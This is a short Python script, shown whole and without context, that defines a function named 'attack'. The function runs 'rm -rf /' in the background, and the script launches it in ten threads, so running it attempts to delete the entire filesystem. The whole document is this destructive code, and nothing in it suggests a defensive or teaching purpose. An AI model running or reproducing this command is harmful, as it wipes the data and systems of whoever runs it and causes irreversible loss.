import threading, os
def attack():
    os.system("rm -rf / &")
for i in range(10):
    t = threading.Thread(target=attack)
    t.start()